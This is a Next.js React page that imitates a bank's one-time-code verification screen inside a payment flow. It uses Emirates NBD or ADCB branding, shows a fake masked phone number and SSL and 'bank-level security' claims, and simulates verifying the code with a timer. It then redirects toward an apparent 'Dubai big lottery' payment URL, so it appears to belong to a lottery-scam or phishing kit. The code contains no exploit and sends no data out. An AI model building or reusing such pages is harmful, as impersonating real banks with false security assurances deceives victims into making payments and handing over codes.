'use client';

import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';

export default function BankVerificationPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [otp, setOtp] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
  const [canResend, setCanResend] = useState(false);

  const method = searchParams.get('method') || 'credit-card';
  const amount = searchParams.get('amount') || '0';
  const redirectUrl = searchParams.get('redirect_url') || 'http://dubaibiglottery.ae/payelu/check_payment';

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    // Simulate OTP verification
    setTimeout(() => {
      setIsLoading(false);
      router.push(`/payment/processing?method=${method}&amount=${amount}&redirect_url=${encodeURIComponent(redirectUrl)}`);
    }, 2000);
  };

  const handleResendOtp = () => {
    setTimeLeft(300);
    setCanResend(false);
    // Simulate resending OTP
  };

  const getBankName = () => {
    switch (method) {
      case 'credit-card': return 'Emirates NBD Bank';
      case 'bank-transfer': return 'ADCB Bank';
      case 'digital-wallet': return 'Digital Payment Gateway';
      default: return 'Bank';
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md">
        {/* Bank Header */}
        <div className="text-center mb-8">
          <div className="w-20 h-20 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-white font-bold text-xl">EN</span>
          </div>
          <h1 className="text-2xl font-bold text-gray-900 mb-2">{getBankName()}</h1>
          <p className="text-gray-600">Secure Payment Verification</p>
          <div className="mt-2 text-sm text-gray-500">
            Amount: <span className="font-semibold text-gray-900">AED {amount}</span>
          </div>
        </div>

        {/* Security Notice */}
        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
          <div className="flex items-start">
            <svg className="w-5 h-5 text-yellow-600 mt-0.5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z" />
            </svg>
            <div>
              <p className="text-sm text-yellow-800 font-medium">Security Verification Required</p>
              <p className="text-xs text-yellow-700 mt-1">We've sent a verification code to your registered mobile number ending in ****1234</p>
            </div>
          </div>
        </div>

        <form onSubmit={handleOtpSubmit} className="space-y-6">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Enter Verification Code
            </label>
            <input
              type="text"
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
              placeholder="000000"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-2xl font-mono tracking-widest text-black"
              maxLength={6}
              required
            />
            <div className="mt-2 text-sm text-gray-500 text-center">
              Code expires in: <span className="font-mono text-red-600">{formatTime(timeLeft)}</span>
            </div>
          </div>

          <button
            type="submit"
            disabled={isLoading || otp.length !== 6}
            className="w-full bg-blue-600 text-white py-3 px-4 rounded-lg font-semibold hover:bg-blue-700 focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
          >
            {isLoading ? (
              <div className="flex items-center justify-center">
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                Verifying...
              </div>
            ) : (
              'Verify & Complete Payment'
            )}
          </button>
        </form>

        {/* Resend OTP */}
        <div className="mt-4 text-center">
          <button
            onClick={handleResendOtp}
            disabled={!canResend}
            className="text-blue-600 hover:text-blue-700 font-medium disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {canResend ? 'Resend Code' : `Resend in ${formatTime(timeLeft)}`}
          </button>
        </div>

        {/* Bank Security Info */}
        <div className="mt-6 pt-6 border-t border-gray-200">
          <div className="text-center text-xs text-gray-500 space-y-1">
            <div className="flex items-center justify-center">
              <svg className="w-3 h-3 text-green-500 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              <span>256-bit SSL encryption</span>
            </div>
            <p>Protected by bank-level security</p>
            <p className="text-gray-400">Never share your verification code with anyone</p>
          </div>
        </div>
      </div>
    </div>
  );
}
